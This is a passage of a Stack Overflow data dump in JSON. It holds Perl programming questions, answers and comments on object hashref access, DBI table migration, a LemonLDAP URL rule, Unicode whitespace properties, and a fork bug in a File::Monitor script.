"https://www.gravatar.com/avatar/ae91d8c26ec40927e017e5148511bdfc?s=128&d=identicon&r=PG", "display_name": "Kyle", "link": "https://stackoverflow.com/users/332332/kyle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 2, "accepted_answer_id": 35270410, "answer_count": 2, "score": 1, "last_activity_date": 1454937989, "creation_date": 1454936102, "question_id": 35270199, "link": "https://stackoverflow.com/questions/35270199/how-can-i-stop-or-allow-a-perl-object-to-be-used-as-a-hashref", "title": "How can I stop or allow a perl object to be used as a hashref?", "body": "<p>I have a Perl class which is a based on a blessed hashref ( <a href=\"https://github.com/kylemhall/Koha/blob/master/Koha/Object.pm\" rel=\"nofollow\">https://github.com/kylemhall/Koha/blob/master/Koha/Object.pm</a> )</p>\n\n<p>This is a community based project, with many developers of varying skill.</p>\n\n<p>What I've seen is some developers accidentally using our objects as hashrefs. The actual data is not stored in the blessed hashref, but in a dbic object that is stored in the hashref ( in $self->{_result} ). When the dev tries something like $object->{id} perl doesn't complain, it just returns undef, as would be expected.</p>\n\n<p>What I'd like to do is to either\nA) Make the script explode with an error when this happens\nB) Allow the use of the hashref syntax for setting / getting values in the dbic objects stored in $self->{_result}</p>\n\n<p>I tried using:</p>\n\n<pre><code>use overload '%{}' =&gt; \\&amp;get_hashref;\n</code></pre>\n\n<p>but when I do this, get_hashref is called any time a regular method is called! This makes sense in a way, since the object itself is a hashref. I'm sure this has something to do with the Perl internals for blessed hashrefs as objects.</p>\n\n<p>Is what I'm trying to accomplish even possible?</p>\n"}, {"tags": ["mysql", "database", "perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1454935459, "post_id": 35269686, "comment_id": 58251078, "body": "Btw, if you want to insert a NULL rather than the string <code>NULL</code>, you want to use <code>undef</code> instead of <code>&#39;NULL&#39;</code>."}], "answers": [{"tags": [], "owner": {"reputation": 6270, "user_id": 3291973, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/z8sOY.jpg?s=128&g=1", "display_name": "Zafar Malik", "link": "https://stackoverflow.com/users/3291973/zafar-malik"}, "is_accepted": false, "score": 2, "last_activity_date": 1454934600, "creation_date": 1454934600, "answer_id": 35269734, "question_id": 35269686, "link": "https://stackoverflow.com/questions/35269686/insert-row-from-one-table-to-another-table-which-has-extra-column/35269734#35269734", "title": "Insert row from one table to another table, which has extra column?", "body": "<p>If there is column mismatch in source and target table then use syntax as per below-</p>\n\n<pre><code>insert into table1(col1,col2,col3) select col1,col2,col3 from table2;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "is_accepted": false, "score": 0, "last_activity_date": 1454936502, "last_edit_date": 1454936502, "creation_date": 1454936153, "answer_id": 35270215, "question_id": 35269686, "link": "https://stackoverflow.com/questions/35269686/insert-row-from-one-table-to-another-table-which-has-extra-column/35270215#35270215", "title": "Insert row from one table to another table, which has extra column?", "body": "<p>Zafar's answer is probably the best and quickest way to do this.</p>\n\n<p>But if you do want to do this row by row, one general rule for database access in a script is: <em>never</em> access a column without explicitly naming it.  So:</p>\n\n<ul>\n<li>No <code>SELECT *</code></li>\n<li>No <code>INSERT INTO table_name VALUES (...)</code></li>\n</ul>\n\n<p>A corrected version of your script, guessing the column names:</p>\n\n<pre><code>my $select = $dbh1-&gt;prepare(\"SELECT pr_id, name, lastname FROM person\");\nmy $insert = $dbh2-&gt;prepare(\"INSERT INTO PERSON(pr_id, name, last_name) VALUES (?,?,?)\");\n\n$select-&gt;execute; \nwhile ( my($PR_ID,$NAME,$LASTNAME) = $select-&gt;fetchrow_array )\n{\n  $insert-&gt;execute($PR_ID,$NAME,$LASTNAME);\n}\n</code></pre>\n\n<p>(Note that you don't need to specify the extra columns in the new table, as long as they are nullable, and you want the value to be NULL.  If you <em>do</em> want to insert a NULL yourself, don't use <code>'NULL'</code>, but use <code>undef</code>, like ikegami says.)</p>\n"}], "owner": {"reputation": 379, "user_id": 1474701, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/679120adfc2610cffd50fe686b361651?s=128&d=identicon&r=PG", "display_name": "ashu", "link": "https://stackoverflow.com/users/1474701/ashu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 708, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1454936502, "creation_date": 1454934445, "question_id": 35269686, "link": "https://stackoverflow.com/questions/35269686/insert-row-from-one-table-to-another-table-which-has-extra-column", "title": "Insert row from one table to another table, which has extra column?", "body": "<p>I am working on migration of data from one db1 to another db2.</p>\n\n<p>I have one scenario, where table Person is present in both databases(db1 and db2).</p>\n\n<p>But the table in db2 has one extra column. Which is best effective way to write the query to migrate data from db1 Person to db2 Person.</p>\n\n<p>I have written as below, is this is the best way to write it? Because if i have more columns and only one extra column, due to which i need to mention all the column names in loop statement.</p>\n\n<pre><code>$select = $dbh1-&gt;prepare(\"SELECT * FROM person\");\n$insert = $dbh2-&gt;prepare(\"INSERT INTO PERSON VALUES (?,?,?,?,?)\");\n\n$select-&gt;execute; \nwhile ( my($PR_ID,$NAME,$LASTNAME) = $select-&gt;fetchrow_array )\n{\n  $insert-&gt;execute($PR_ID,$NAME,$LASTNAME,'NULL','NULL');\n}\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 1, "creation_date": 1454931232, "post_id": 35268140, "comment_id": 58248501, "body": "<a href=\"http://p3rl.org/perlre\" rel=\"nofollow noreferrer\">p3rl.org/perlre</a>"}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454946919, "post_id": 35269725, "comment_id": 58259190, "body": "Adjusted my answer for changes to the question."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1454946865, "last_edit_date": 1454946865, "creation_date": 1454934578, "answer_id": 35269725, "question_id": 35268140, "link": "https://stackoverflow.com/questions/35268140/lemonldap-skin-rule-based-on-url-parameter/35269725#35269725", "title": "Lemonldap skin rule based on url parameter", "body": "<p>You're looking for</p>\n\n<pre><code>$_url =~ /dark/\n</code></pre>\n\n<p>The match operator is documented in <a href=\"http://perldoc.perl.org/perlop.html\" rel=\"nofollow\">perlop</a>. (Search for the bullet starting with <code>m/PATTERN/</code>.)</p>\n\n<p>It's a poor check since it looks for <code>dark</code> anywhere in the URL. The following would be better:</p>\n\n<pre><code>$_url =~ /[?&amp;;]skin=dark(?:[&amp;;]|\\z)/\n</code></pre>\n"}], "owner": {"reputation": 1605, "user_id": 4190617, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/6691aae8caa1f3b61a89d8fcefc415ce?s=128&d=identicon&r=PG&f=1", "display_name": "YLombardi", "link": "https://stackoverflow.com/users/4190617/ylombardi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "accepted_answer_id": 35269725, "answer_count": 1, "score": -2, "last_activity_date": 1454946865, "creation_date": 1454929653, "last_edit_date": 1454935017, "question_id": 35268140, "link": "https://stackoverflow.com/questions/35268140/lemonldap-skin-rule-based-on-url-parameter", "title": "Lemonldap skin rule based on url parameter", "body": "<p>I try to configure lemonldap to use different skin based on the url.</p>\n\n<p>I use this documentation :\n<a href=\"http://lemonldap-ng.org/documentation/1.9/portalcustom\" rel=\"nofollow\">http://lemonldap-ng.org/documentation/1.9/portalcustom</a></p>\n\n<p>It says:</p>\n\n<blockquote>\n  <p>Rule: a Perl expression (you can use %ENV hash to get environment variables, or $_url to get URL called before redirection, or $ipAddr to use user IP address). If the rule evaluation is true, the corresponding skin is applied.</p>\n</blockquote>\n\n<p>I try to write a rule that return true if the $_url contains a parameter. But I don't know Perl language.</p>\n\n<p>For example, if the url is <a href=\"http://myurl:8097/?skin=dark\" rel=\"nofollow\">http://myurl:8097/?skin=dark</a>, I want to use the dark skin. If the url is <a href=\"http://myurl:8097/?skin=pastel\" rel=\"nofollow\">http://myurl:8097/?skin=pastel</a>, I want to use the pastel skin. </p>\n\n<p>How can I check this with a perl expression?</p>\n\n<p>I already try:</p>\n\n<pre><code>$_url =~ dark\n\n$_url =~ $dark\n\n$_url =~ /dark\n</code></pre>\n\n<p>None of this works.</p>\n"}, {"tags": ["perl", "unicode", "whitespace", "raku"], "answers": [{"tags": [], "owner": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "is_accepted": true, "score": 2, "last_activity_date": 1454921906, "creation_date": 1454921906, "answer_id": 35265622, "question_id": 35265023, "link": "https://stackoverflow.com/questions/35265023/unicode-property-space-in-perl-5-and-perl-6/35265622#35265622", "title": "Unicode property &quot;Space&quot; in Perl 5 and Perl 6", "body": "<p>It's not really an extension, but it's a shorthand name for another Unicode property, <code>\\p{White_Space}</code>. This is documented in detail in the manpage <code>perluniprops</code>.</p>\n\n<p>I have no idea what the Perl6 people are doing here.</p>\n"}, {"comments": [{"owner": {"reputation": 21019, "user_id": 198183, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/52f281a988bae754991af26224c796af?s=128&d=identicon&r=PG", "display_name": "sid_com", "link": "https://stackoverflow.com/users/198183/sid-com"}, "edited": false, "score": 0, "creation_date": 1454927944, "post_id": 35267206, "comment_id": 58246435, "body": "I have it already replaced with <code>&lt;:White_Space&gt;</code> but I was curious why <code>Space</code> behaves differently in Perl5/Perl6."}, {"owner": {"reputation": 148928, "user_id": 48015, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0b722a5f7d2d809629ee40c63cc8576b?s=128&d=identicon&r=PG", "display_name": "Christoph", "link": "https://stackoverflow.com/users/48015/christoph"}, "reply_to_user": {"reputation": 21019, "user_id": 198183, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/52f281a988bae754991af26224c796af?s=128&d=identicon&r=PG", "display_name": "sid_com", "link": "https://stackoverflow.com/users/198183/sid-com"}, "edited": false, "score": 2, "creation_date": 1454928161, "post_id": 35267206, "comment_id": 58246556, "body": "@sid_com: it&#39;s just that Perl5 chose to alias <code>\\p{Space}</code> to <code>\\p{White_Space=Y}</code> instead of <code>\\p{General_Category=Space}</code>"}, {"owner": {"reputation": 148928, "user_id": 48015, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0b722a5f7d2d809629ee40c63cc8576b?s=128&d=identicon&r=PG", "display_name": "Christoph", "link": "https://stackoverflow.com/users/48015/christoph"}, "reply_to_user": {"reputation": 21019, "user_id": 198183, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/52f281a988bae754991af26224c796af?s=128&d=identicon&r=PG", "display_name": "sid_com", "link": "https://stackoverflow.com/users/198183/sid-com"}, "edited": false, "score": 2, "creation_date": 1454928370, "post_id": 35267206, "comment_id": 58246716, "body": "or rather, <code>\\p{General_Category=Zs}</code>"}, {"owner": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "edited": false, "score": 0, "creation_date": 1454980249, "post_id": 35267206, "comment_id": 58275952, "body": "Oh, dear.  That&#39;s the sort of subtle correction that will yield years of debugging fun."}], "tags": [], "owner": {"reputation": 148928, "user_id": 48015, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0b722a5f7d2d809629ee40c63cc8576b?s=128&d=identicon&r=PG", "display_name": "Christoph", "link": "https://stackoverflow.com/users/48015/christoph"}, "is_accepted": false, "score": 7, "last_activity_date": 1454927911, "last_edit_date": 1454927911, "creation_date": 1454926807, "answer_id": 35267206, "question_id": 35265023, "link": "https://stackoverflow.com/questions/35265023/unicode-property-space-in-perl-5-and-perl-6/35267206#35267206", "title": "Unicode property &quot;Space&quot; in Perl 5 and Perl 6", "body": "<p>Tabulators are of category <em>Control</em>, not <em>Space</em>. The property you're interested in is actually called <em>White_Space</em>, and that's what you need to use in Perl 6:</p>\n\n<pre><code>say so \"\\t\" ~~ /&lt;:White_Space&gt;/\n</code></pre>\n\n<p>Several alternative spellings appear to be available as well, including <em>WhiteSpace</em>, <em>WSpace</em> and its lower-case variants, but <strong>not</strong> <em>WS</em>.</p>\n\n<p>There is also a built-in rule <code>&lt;ws&gt;</code>, which matches zero or more whitespace characters instead of a single one, and of course <code>\\s</code>, which already uses Unicode semantics.</p>\n"}], "owner": {"reputation": 21019, "user_id": 198183, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/52f281a988bae754991af26224c796af?s=128&d=identicon&r=PG", "display_name": "sid_com", "link": "https://stackoverflow.com/users/198183/sid-com"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 1, "accepted_answer_id": 35265622, "answer_count": 2, "score": 3, "last_activity_date": 1454927911, "creation_date": 1454919532, "question_id": 35265023, "link": "https://stackoverflow.com/questions/35265023/unicode-property-space-in-perl-5-and-perl-6", "title": "Unicode property &quot;Space&quot; in Perl 5 and Perl 6", "body": "<p>Is the unicode-property <code>\\p{Space}</code> a Perl5 extension?</p>\n\n<p>In Perl5 <code>Space</code> matches all white-spaces</p>\n\n<pre><code>my $s = \"one\\ttwo\\nthree\";\n$s =~ s/\\p{Space}/*/g;\nsay $s;\n\n# one*two*three\n</code></pre>\n\n<p>while in Per6 it maybe matches only a simple space</p>\n\n<pre><code>my $s = \"one\\ttwo\\nthree\";\n$s.=subst( /&lt;:Space&gt;/, '*', :g );\nsay $s;\n\n# one     two\n# three\n</code></pre>\n"}, {"tags": ["perl", "file", "inotify"], "comments": [{"owner": {"reputation": 517, "user_id": 1790431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/562224a0d80bd2dd82519d1502cac09c?s=128&d=identicon&r=PG", "display_name": "Phyreprooph", "link": "https://stackoverflow.com/users/1790431/phyreprooph"}, "edited": false, "score": 0, "creation_date": 1454918895, "post_id": 35264725, "comment_id": 58241311, "body": "Have you tried removing duplicates from the array before opening the for loop? <b>EDIT:</b> Also how fast are the files being created after one another?"}, {"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 517, "user_id": 1790431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/562224a0d80bd2dd82519d1502cac09c?s=128&d=identicon&r=PG", "display_name": "Phyreprooph", "link": "https://stackoverflow.com/users/1790431/phyreprooph"}, "edited": false, "score": 0, "creation_date": 1454920818, "post_id": 35264725, "comment_id": 58242176, "body": "@Phyreprooph which duplicate entries are you talking about ? and files are generated at random intervals"}, {"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 517, "user_id": 1790431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/562224a0d80bd2dd82519d1502cac09c?s=128&d=identicon&r=PG", "display_name": "Phyreprooph", "link": "https://stackoverflow.com/users/1790431/phyreprooph"}, "edited": false, "score": 0, "creation_date": 1454926335, "post_id": 35264725, "comment_id": 58245392, "body": "@7stud can you help me here"}, {"owner": {"reputation": 517, "user_id": 1790431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/562224a0d80bd2dd82519d1502cac09c?s=128&d=identicon&r=PG", "display_name": "Phyreprooph", "link": "https://stackoverflow.com/users/1790431/phyreprooph"}, "edited": false, "score": 0, "creation_date": 1454979699, "post_id": 35264725, "comment_id": 58275796, "body": "Sorry I&#39;m talking about possible duplicates in <code>@new_file_paths</code>. That could be the reason multiple things are being printed out. Alternatively, back up your script and remove the forking part and see what prints out. That&#39;ll tell you if it is the forking part causing this issue"}, {"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 517, "user_id": 1790431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/562224a0d80bd2dd82519d1502cac09c?s=128&d=identicon&r=PG", "display_name": "Phyreprooph", "link": "https://stackoverflow.com/users/1790431/phyreprooph"}, "edited": false, "score": 0, "creation_date": 1454989116, "post_id": 35264725, "comment_id": 58278050, "body": "@Phyreprooph Like you said after removing forking part it looks fine but yet thoroughly check multiple test cases."}, {"owner": {"reputation": 517, "user_id": 1790431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/562224a0d80bd2dd82519d1502cac09c?s=128&d=identicon&r=PG", "display_name": "Phyreprooph", "link": "https://stackoverflow.com/users/1790431/phyreprooph"}, "edited": false, "score": 0, "creation_date": 1455001262, "post_id": 35264725, "comment_id": 58282060, "body": "What exactly are you forking for? It looks like you are exponentially creating new threads. each time you make a thread that thread then makes a thread and for every thread that is active when a file is created, they are all picking up that the file has been created and printing to the log.  <b>EDIT:</b> As far as your question goes, you are asking why you are receiving multiple outputs. You haven&#39;t provided any information about the purpose of the forking so I can&#39;t really help you with that. It doesn&#39;t look like it&#39;s doing much so if all you want is the output correct then just remove the fork."}, {"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 517, "user_id": 1790431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/562224a0d80bd2dd82519d1502cac09c?s=128&d=identicon&r=PG", "display_name": "Phyreprooph", "link": "https://stackoverflow.com/users/1790431/phyreprooph"}, "edited": false, "score": 0, "creation_date": 1455001588, "post_id": 35264725, "comment_id": 58282192, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/102962/discussion-between-shantesh-and-phyreprooph\">continue this discussion in chat</a>."}, {"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 517, "user_id": 1790431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/562224a0d80bd2dd82519d1502cac09c?s=128&d=identicon&r=PG", "display_name": "Phyreprooph", "link": "https://stackoverflow.com/users/1790431/phyreprooph"}, "edited": false, "score": 1, "creation_date": 1455002622, "post_id": 35264725, "comment_id": 58282701, "body": "@Phyreprooph Yes you are right! after removing the fork part it is working fine and my initial idea was to use forking to execute a script inside <code>if ($pid == 0) { #then in child process         system(&quot;perl $script $path \\&amp;&quot;);     }</code> and i didn&#39;t know i can do it directly ! thats the reason i was using fork looks like its works fine for me"}, {"owner": {"reputation": 656, "user_id": 2048692, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5e08c2925834b6de9110189e92cfd75f?s=128&d=identicon&r=PG", "display_name": "gsl", "link": "https://stackoverflow.com/users/2048692/gsl"}, "edited": false, "score": 0, "creation_date": 1455034469, "post_id": 35264725, "comment_id": 58303776, "body": "It would be nice to have the corrected code as an approved answer."}], "answers": [{"comments": [{"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "edited": false, "score": 0, "creation_date": 1455089201, "post_id": 35309156, "comment_id": 58327825, "body": "But i am still not getting why i was getting the multiple entries when i used fork."}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 1, "creation_date": 1455089337, "post_id": 35309156, "comment_id": 58327891, "body": "You weren&#39;t <i>exiting</i> in the child, so the parent and the child were both continuing through the loop, monitoring, and forking again. First time, one process. Second time, two processes. Third time, four processes. Fourth time, eight processes."}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1455089414, "post_id": 35309156, "comment_id": 58327920, "body": "If you had more files modified (say, more than ten) you would have ended up with thousands of processes monitoring and printing."}, {"owner": {"reputation": 656, "user_id": 2048692, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5e08c2925834b6de9110189e92cfd75f?s=128&d=identicon&r=PG", "display_name": "gsl", "link": "https://stackoverflow.com/users/2048692/gsl"}, "edited": false, "score": 0, "creation_date": 1455116407, "post_id": 35309156, "comment_id": 58345812, "body": "I am actually still getting the old behaviour, ie. , first reports 1 log, then 2, 4, 8, etc. I am using code as the answer above, only I have added <code>my (@pids);</code> to take care of a compilation warning."}, {"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 656, "user_id": 2048692, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5e08c2925834b6de9110189e92cfd75f?s=128&d=identicon&r=PG", "display_name": "gsl", "link": "https://stackoverflow.com/users/2048692/gsl"}, "edited": false, "score": 0, "creation_date": 1455190779, "post_id": 35309156, "comment_id": 58383829, "body": "@gsl please delete for loop which is not required anymore"}, {"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 656, "user_id": 2048692, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5e08c2925834b6de9110189e92cfd75f?s=128&d=identicon&r=PG", "display_name": "gsl", "link": "https://stackoverflow.com/users/2048692/gsl"}, "edited": false, "score": 0, "creation_date": 1455190808, "post_id": 35309156, "comment_id": 58383849, "body": "@gsl exactly this part <code>for my $pid (@pids) {     waitpid($pid, 0)  #0 =&gt; block }</code>"}, {"owner": {"reputation": 656, "user_id": 2048692, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5e08c2925834b6de9110189e92cfd75f?s=128&d=identicon&r=PG", "display_name": "gsl", "link": "https://stackoverflow.com/users/2048692/gsl"}, "edited": false, "score": 0, "creation_date": 1455199407, "post_id": 35309156, "comment_id": 58390019, "body": "I removed that code. I now have the same code as in the answer (except of course different path to script and watched folder), but I still have the same issue. Perhaps the script does not end the while loop, and so continues to work?"}, {"owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "reply_to_user": {"reputation": 656, "user_id": 2048692, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5e08c2925834b6de9110189e92cfd75f?s=128&d=identicon&r=PG", "display_name": "gsl", "link": "https://stackoverflow.com/users/2048692/gsl"}, "edited": false, "score": 0, "creation_date": 1455263960, "post_id": 35309156, "comment_id": 58421190, "body": "@gsl the purpose of this script is to monitor a directory and trigger a notification for any *.log file generation and pass that *.log to ` $script` and i want to run this script indefinitely."}], "tags": [], "owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "is_accepted": true, "score": 0, "last_activity_date": 1455190749, "last_edit_date": 1455190749, "creation_date": 1455089155, "answer_id": 35309156, "question_id": 35264725, "link": "https://stackoverflow.com/questions/35264725/perl-filemonitor-module-notifying-multiple-notifications-for-the-new-file-crea/35309156#35309156", "title": "Perl File::Monitor module notifying multiple notifications for the new file created whereas i expect one notification", "body": "<p>Here's what solved my problem</p>\n\n<pre><code>use strict;\nuse warnings;\nuse File::Monitor;\nuse File::Basename;\nuse Time::HiRes qw {usleep};\nmy $script = '/homw/goudarsh/Desktop/script.pl';\nsub textfile_notifier {\nmy ($watch_name, $event, $change) = @_; \n\nmy @new_file_paths = $change-&gt;files_created; #The change object has a property called files_created, \n                                         #which contains the names of any new files\nfor my $path (@new_file_paths) {\nmy ($base, $fname, $ext) = fileparse($path, '.log'); # $ext is \"\" if the '.txt' extension is\n                                                     # not found, otherwise it's '.txt'.\nif ($ext eq '.log') {\n    print \"$path was created\\n\";\n    system(\"perl $script $path \\&amp;\");\n}\n}}\nmy $monitor = File::Monitor-&gt;new();\n$monitor-&gt;watch( {\nname        =&gt; '/home/goudarsh/Desktop/logs/',\nrecurse     =&gt; 1,\ncallback    =&gt; {files_created =&gt; \\&amp;textfile_notifier},  #event =&gt; handler 1 \n} );\n\n$monitor-&gt;scan;\nwhile (1) {\n$monitor-&gt;scan; #Scanning the directory one\nsleep(2);\n#usleep(10_000); #$microseconds = 750_000;\n\n}\n</code></pre>\n\n<p>All i wanted to execute a  <code>$script</code> with <code>$path</code> as an argument and i used forking for creating child process but i was wrong about the concept of using fork which was not needed! now without forking i can do whatever was required and i am happy for learning new things</p>\n"}], "owner": {"reputation": 1040, "user_id": 3882175, "user_type": "registered", "accept_rate": 31, "profile_image": "https://i.stack.imgur.com/93YQI.jpg?s=128&g=1", "display_name": "Shantesh", "link": "https://stackoverflow.com/users/3882175/shantesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 224, "favorite_count": 0, "accepted_answer_id": 35309156, "answer_count": 1, "score": 1, "last_activity_date": 1455190749, "creation_date": 1454918067, "last_edit_date": 1454926122, "question_id": 35264725, "link": "https://stackoverflow.com/questions/35264725/perl-filemonitor-module-notifying-multiple-notifications-for-the-new-file-crea", "title": "Perl File::Monitor module notifying multiple notifications for the new file created whereas i expect one notification", "body": "<p>Below is the code snippet! i am using for file creatiing notification using Perl module File::Monitor. </p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse File::Monitor;\nuse File::Basename;\nuse Time::HiRes qw {usleep};\n\nmy $pid,@pids;\n\n\nsub textfile_notifier {\nmy ($watch_name, $event, $change) = @_; \n\nmy @new_file_paths = $change-&gt;files_created; #The change object has a property called files_created, \n                                             #which contains the names of any new files\nfor my $path (@new_file_paths) {\n    my ($base, $fname, $ext) = fileparse($path, '.log'); # $ext is \"\" if the '.txt' extension is\n                                                         # not found, otherwise it's '.txt'.\n    if ($ext eq '.log') {\n        print \"$path was created\\n\";\n    #-----------------------------------------Forking part #-----------------------------------------\n    defined ($pid = fork()) or die \"Couldn't fork: $!\";\n    if ($pid == 0) { #then in child process\n        print \"Loop got executed\\n\";\n    }\n    else {  #then in parent process, where $pid is the pid of the child\n        push @pids, $pid;\n    }\n    #-----------------------------------------Forking part ends here #-----------------------------------------\n    }\n}\n}\n\nmy $monitor = File::Monitor-&gt;new();\n\n$monitor-&gt;watch( {\nname        =&gt; '/home/goudarsh/Desktop/logs/',\nrecurse     =&gt; 1,\ncallback    =&gt; {files_created =&gt; \\&amp;textfile_notifier},  #event =&gt; handler 1 \n} );\n\n$monitor-&gt;scan;\nwhile (1) {\n$monitor-&gt;scan; #Scanning the directory 